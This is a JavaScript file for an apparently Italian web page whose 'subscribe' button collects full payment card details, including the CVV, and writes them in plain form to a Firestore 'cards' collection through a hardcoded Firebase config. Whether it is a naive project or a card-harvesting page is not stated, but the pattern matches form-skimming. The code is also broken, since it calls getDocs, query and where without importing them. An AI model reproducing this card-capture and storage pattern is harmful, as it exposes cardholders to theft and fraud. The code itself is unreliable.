import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.2/firebase-app.js";
import { getAnalytics } from "https://www.gstatic.com/firebasejs/10.7.2/firebase-analytics.js";
import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.7.2/firebase-firestore.js";

const firebaseConfig = {
  apiKey: "AIzaSyANAPty9_gSmbL647aweJQxcpkEfXSfAI4",
  authDomain: "mercury-54d92.firebaseapp.com",
  projectId: "mercury-54d92",
  storageBucket: "mercury-54d92.appspot.com",
  messagingSenderId: "1066288131149",
  appId: "1:1066288131149:web:4bfc99b0be474efacac004",
  measurementId: "G-T9J18PR843"
};

async function saveCardDataToFirestore(cardNumber, cardHolderName, expiryDate, cvv, postalCode, country, province) {
  const app = initializeApp(firebaseConfig);
  const analytics = getAnalytics(app);
  const db = getFirestore(app);

  try {
    
    const cardsRef = collection(db, 'cards');
    const querySnapshot = await getDocs(query(cardsRef, where('cardNumber', '==', cardNumber)));

    if (!querySnapshot.empty) {
      
      alert('Questa carta è già registrata.');
      return;
    }
    
    await addDoc(collection(db, 'cards'), {
      cardNumber,
      cardHolderName,
      expiryDate,
      cvv,
      postalCode,
      country,
      province,
    });
    alert('Dati della carta salvati con successo');
    window.location.href='page.html';
  } catch (error) {
    alert('Errore durante il salvataggio dei dati della carta nel database: ' + error.message);
  }
}


function handleSubscribeButtonClick() {
  
  const cardNumber = document.querySelector('input[placeholder="CARD NUMBER"]').value;
  const cardHolderName = document.querySelector('input[placeholder="FIRST NAME"]').value +
    ' ' + document.querySelector('input[placeholder="USERNAME"]').value;
  const expiryDate = document.getElementById('birthdate').value;
  const cvv = document.querySelector('input[placeholder="000"]').value;
  const postalCode = document.querySelector('input[placeholder="POSTAL"]').value;
  const country = document.getElementById('nazioni').value;
  const province = document.getElementById('citta').value;
  console.log(cardNumber);

 
  saveCardDataToFirestore(cardNumber, cardHolderName, expiryDate, cvv, postalCode, country, province);
}


document.addEventListener('DOMContentLoaded', function() {
  const subscribeButton = document.querySelector('.transparent-button');
  subscribeButton.addEventListener('click', handleSubscribeButtonClick);
});